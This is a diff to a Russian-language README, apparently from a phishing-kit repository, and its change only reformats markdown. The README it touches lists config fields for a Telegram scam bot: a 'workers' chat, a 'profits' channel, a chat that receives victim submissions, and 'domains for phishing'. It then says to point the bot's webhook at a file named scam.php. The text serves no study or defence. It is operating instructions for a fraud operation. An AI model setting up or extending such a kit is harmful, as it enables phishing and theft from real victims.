@@ -4,15 +4,15 @@
 ____
 1) Настроить файл `_config.php`
   1) *botToken** - токен бота от @BotFather
-  2)**botLogin** - логин бота без @
-  3)**prjName** - имя проекта 
-  5)**linkChat** - ссылка на чат воркеров
-  6)**linkPays** - ссылка на канал с профитами
-  7)**chatGroup** - ID чата воркеров
-  8)**chatAdmin** - ID чата админов
-  9)**chatAlerts** - ID чата куда будут приходить заявки
-  10)**chatProfits** - ID канала профитов
-  11)**allDomains** - домены дял фишинга 
+  2)*botLogin** - логин бота без @
+  3)*prjName** - имя проекта 
+  5)*linkChat** - ссылка на чат воркеров
+  6)*linkPays** - ссылка на канал с профитами
+  7)*chatGroup** - ID чата воркеров
+  8)*chatAdmin** - ID чата админов
+  9)*chatAlerts** - ID чата куда будут приходить заявки
+  10)*chatProfits** - ID канала профитов
+  11)*allDomains** - домены дял фишинга 
  
 2) Кинуть webhook на файлик `scam.php`
  ``` https://api.telegram.org/botTOKEN/setWebhook?url=DOMAIN/scam.php ```
